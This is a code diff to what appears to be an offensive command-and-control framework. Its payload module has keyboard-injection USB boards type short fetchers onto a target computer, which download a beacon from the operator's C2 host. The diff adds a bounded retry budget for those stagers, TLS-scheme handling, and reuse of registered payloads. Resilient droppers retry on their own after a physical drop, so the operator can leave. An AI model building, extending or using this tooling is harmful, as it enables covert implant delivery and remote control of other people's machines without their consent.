@@ -116,7 +116,8 @@ class PayloadModule(BaseModule):
                           "bind [port]", "deploy", "privesc"],
                 "DELIVERY": ["hid <board> [\"<command>\" | --from-payload <id> | "
                              "--stager <os>] [--stager-mode <m>] "
-                             "[--type-into <os>] [--out <file>]"],
+                             "[--stager-attempts <n>] [--type-into <os>] "
+                             "[--out <file>]"],
                 "LISTENER": ["handler <port> <payload>"],
             },
             self.suggest_commands(),
@@ -309,6 +310,21 @@ class PayloadModule(BaseModule):
                           Both modes fetch the SAME artefact from the same
                           C2 route, so switching does not change what lands
                           on the target.
+                          --from-payload is the exception to the default:
+                          there `inline` stays the default and means "type
+                          the command that already exists", which is what
+                          that path has always done. Pass --stager-mode
+                          download with --from-payload and it reads the
+                          endpoint the registered payload was BUILT for and
+                          types a short fetcher instead, so an 11.4k
+                          registered command does not get typed either.
+          --stager-attempts <n>
+                          how many times the download stager's retry loop
+                          may try before it gives up and EXITS (default:
+                          `c2.stager_attempts` / PHANTOM_STAGER_ATTEMPTS,
+                          else 20). A loop with no budget is an invisible
+                          process polling a dead endpoint for ever, so this
+                          is bounded on purpose.
           --strict        refuse (instead of asking) when the command does
                           not match --type-into
           --out <file>    where to write the artefact (default:
@@ -359,6 +375,8 @@ class PayloadModule(BaseModule):
         from_payload = ""
         stager = ""
         stager_mode = ""
+        stager_mode_given = False
+        stager_attempts = 0
         layout = "us"
         out = ""
         delay_ms = 1500
@@ -366,6 +384,7 @@ class PayloadModule(BaseModule):
         open_run = False
         arm = False
         arm_pin = 7
+        arm_pin_given = False
         flash = ""
         fqbn = ""
         arduino_cli = ""
@@ -400,11 +419,27 @@ class PayloadModule(BaseModule):
                     notifier.error("--stager-mode wants download or inline")
                     return
                 stager_mode = parts[i + 1].lower()
+                stager_mode_given = True
                 if stager_mode not in ("download", "inline"):
                     notifier.error(
                         f"unknown --stager-mode '{stager_mode}': download "
                         f"lets the C2 serve the beacon (short — the HID "
                         f"default), inline types the whole one-liner")
+                    return
+                i += 2
+                continue
+            if tok == "--stager-attempts":
+                if i + 1 >= len(parts):
+                    notifier.error("--stager-attempts wants a count")
+                    return
+                try:
+                    stager_attempts = int(parts[i + 1])
+                except ValueError:
+                    notifier.error("--stager-attempts wants a count")
+                    return
+                if stager_attempts < 1:
+                    notifier.error("--stager-attempts must be at least 1: a "
+                                   "stager with no attempt left is a no-op.")
                     return
                 i += 2
                 continue
@@ -454,6 +489,7 @@ class PayloadModule(BaseModule):
                 except ValueError:
                     notifier.error("--arm-pin wants a pin number")
                     return
+                arm_pin_given = True
                 i += 2
                 continue
             if tok == "--strict":
@@ -489,21 +525,54 @@ class PayloadModule(BaseModule):
             notifier.error("--flash uploads through arduino-cli, which only "
                            "serves the 'arduino' board")
             return
+        # ARMED OR NOT IS A SAFETY PROPERTY, so a flag that cannot take
+        # effect is an error, not a silence: an operator who asked for an
+        # armed board and got one that fires on power-up has been misled
+        # about the only thing that matters here.
+        if arm and board not in ARDUINO_BOARDS:
+            notifier.error(
+                f"--arm needs a board with a firmware loop to hang a button "
+                f"on: '{board_arg or board}' types its script the moment it "
+                f"is powered and cannot be armed. Use an Arduino board "
+                f"({', '.join(sorted(ARDUINO_BOARDS))}) or drop --arm.")
+            return
+        if arm_pin_given and not arm:
+            notifier.error(
+                "--arm-pin has no effect without --arm: the board has to be "
+                "armed before a pin can matter. Add --arm, or drop "
+                "--arm-pin.")
+            return
         if from_payload and stager:
             notifier.error("--from-payload uses the command that already "
                            "exists and --stager builds a new one: pick one.")
             return
-        if stager_mode and not stager:
-            notifier.error("--stager-mode decides how --stager is delivered: "
-                           "pass --stager <os> with it.")
+        if stager_mode and not stager and not from_payload:
+            notifier.error("--stager-mode decides how the stager is "
+                           "delivered: pass --stager <os> with it, or use "
+                           "it with --from-payload.")
             return
-        if not stager_mode:
-            # HID DEFAULT: the board types a FETCHER and the C2 serves the
-            # beacon. The channels that paste a command (generate, exploit,
-            # c2) never reach this flag — nothing is typed for them, so an
-            # inline one-liner costs them nothing and their default is
-            # unchanged.
-            stager_mode = "download"
+        if not stager_mode_given:
+            # HID DEFAULT for --stager: the board types a FETCHER and the C2
+            # serves the beacon. The channels that paste a command (generate,
+            # exploit, c2) never reach this flag — nothing is typed for them,
+            # so an inline one-liner costs them nothing and their default is
+            # unchanged. `--from-payload` keeps ITS documented default (the
+            # registered command), because on that path the command already
+            # exists: download there is available, not assumed.
+            stager_mode = "inline" if from_payload else "download"
+        if stager_attempts and stager_mode == "inline":
+            notifier.error("--stager-attempts configures the DOWNLOAD "
+                           "stager's retry loop, and inline has no loop." +
+                           (" This --from-payload has no --stager-mode, so it "
+                            "is about to type the registered command: pass "
+                            "--stager-mode download for a retry budget to "
+                            "mean anything." if from_payload else ""))
+            return
+        if stager_attempts and not (stager or from_payload):
+            notifier.error("--stager-attempts configures the DOWNLOAD "
+                           "stager's retry loop: pass --stager <os> or "
+                           "--from-payload.")
+            return
         if from_payload and command:
             notifier.error(
                 "--from-payload plus an inline command is two sources for one "
@@ -548,6 +617,47 @@ class PayloadModule(BaseModule):
             notifier.info(f"payload {str(entry.get('id', ''))[:8]}.. "
                           f"({payload_platform or 'unknown'}): "
                           f"{entry.get('description', '')}")
+
+        def _download_stager(platform: str, host: str, port: int,
+                             use_ssl: bool, attempts: int) -> str:
+            """The short HID fetcher, or "" with the refusal already reported."""
+            from phantom.utils import short_stager as ss
+            from phantom.utils.c2_crypto import get_payload_token
+            try:
+                return ss.hid_download_command(
+                    platform, host, port, token=get_payload_token(),
+                    ssl=use_ssl, attempts=attempts or None)
+            except ValueError as exc:
+                notifier.error(str(exc))
+                return ""
+
+        if from_payload and stager_mode == "download":
+            # `--from-payload` ALONE means "type the registered command" and
+            # that is unchanged — the registered Windows command is ~11.4k
+            # chars, though, and reusing a payload is how HID is actually
+            # used (generate once, type many), so download mode is offered
+            # here too. It reads the endpoint the registered payload was
+            # BUILT for and types a short fetcher for it, so a payload
+            # generated against another listener is never silently
+            # re-pointed at this session's config.
+            from phantom.utils import short_stager as ss
+            endpoint = ss.endpoint_from_registered_command(command)
+            if not endpoint:
+                notifier.error(
+                    f"payload {from_payload} carries no C2 endpoint I can "
+                    f"read, so a download stager cannot be built for it. "
+                    f"Use --stager-mode inline to type it as registered.")
+                return
+            host, port, use_ssl = endpoint
+            command = _download_stager(payload_platform, host, port, use_ssl,
+                                       stager_attempts)
+            if not command:
+                return
+            notifier.info(
+                f"download stager for the registered "
+                f"{payload_platform or 'unknown'} payload: {len(command)} "
+                f"chars typed, fetching from the endpoint it was built for "
+                f"({'https' if use_ssl else 'http'}://{host}:{port})")
         if stager:
             if target and target != stager:
                 notifier.error(
@@ -555,8 +665,16 @@ class PayloadModule(BaseModule):
                     f"one artefact, and PE ≠ ELF ≠ Mach-O — pick one.")
                 return
             from phantom.utils import config as cfg
+            from phantom.utils.network import c2_use_ssl
             host = session.lhost or self._get_lhost()
             port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
+            # TLS is CONFIGURATION, not a constant. A dropper built with a
+            # literal `True` against an HTTP listener says https://, fetches
+            # nothing, and spends its whole retry budget on a port that was
+            # never going to answer — invisibly. The live listener decides
+            # when one is running; `c2.ssl` otherwise.
+            use_ssl = c2_use_ssl()
+            scheme = "https" if use_ssl else "http"
             if stager_mode == "download":
                 # The board types every character ON SCREEN, which is the
                 # whole reason this branch exists: the inline Windows stager
@@ -565,24 +683,19 @@ class PayloadModule(BaseModule):
                 # ~300-char fetcher and the C2 serves the beacon from the
                 # SAME route the inline dropper fetches from, so the artefact
                 # is byte-identical either way.
-                from phantom.utils import short_stager as ss
-                from phantom.utils.c2_crypto import get_payload_token
-                try:
-                    command = ss.hid_download_command(
-                        stager, host, port, token=get_payload_token(),
-                        ssl=True)
-                except ValueError as exc:
-                    notifier.error(str(exc))
+                command = _download_stager(stager, host, port, use_ssl,
+                                           stager_attempts)
+                if not command:
                     return
                 notifier.info(f"download stager for {stager}: {len(command)} "
-                              f"chars typed, the C2 at {host}:{port} serves "
-                              f"the beacon")
+                              f"chars typed, the C2 at {scheme}://{host}:"
+                              f"{port} serves the beacon")
             else:
                 from phantom.utils.builder import generate_dropper
-                command = generate_dropper(stager, host, port, use_ssl=True,
-                                           resilient=True)
+                command = generate_dropper(stager, host, port,
+                                           use_ssl=use_ssl, resilient=True)
                 notifier.info(f"inline stager for {stager} built with the "
-                              f"current C2 endpoint ({host}:{port}): "
+                              f"current C2 endpoint ({scheme}://{host}:{port}): "
                               f"{len(command)} chars will be typed")
             target = target or stager
             payload_platform = payload_platform or stager
@@ -756,8 +869,12 @@ class PayloadModule(BaseModule):
         then print the one-liner to execute on the target."""
         os_string, arch, platform = self._guess_os()
         from phantom.utils import config as cfg
+        from phantom.utils.network import c2_use_ssl
         c2_host = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
         c2_port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
+        # same rule as the HID stager: the scheme follows the listener (and
+        # `c2.ssl`), never a literal True
+        use_ssl = c2_use_ssl()
         notifier.info(f"Target platform: {platform} ({arch}) — {os_string}")
         notifier.info(f"C2 callback: {c2_host}:{c2_port}")
         try:
@@ -773,7 +890,7 @@ class PayloadModule(BaseModule):
                 platform, os.path.dirname(phantom.__file__),
                 force_rebuild=(beacon_config_endpoint(beacon_dir)
                                != (c2_host, c2_port)), arch=arch,
-                host=c2_host, port=c2_port, use_ssl=True)
+                host=c2_host, port=c2_port, use_ssl=use_ssl)
             if not binary:
                 notifier.error("Beacon build failed (cross-toolchain missing?)")
                 return
@@ -795,8 +912,8 @@ class PayloadModule(BaseModule):
         # run before the C2 is up (a physical drop, a staged exfil). If the
         # first download fails it schedules its own retry with the endpoint
         # already embedded, so the operator types it once and walks away.
-        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True,
-                                   resilient=True)
+        dropper = generate_dropper(platform, c2_host, c2_port,
+                                   use_ssl=use_ssl, resilient=True)
         if not dropper:
             notifier.error("No dropper defined for this platform.")
             return
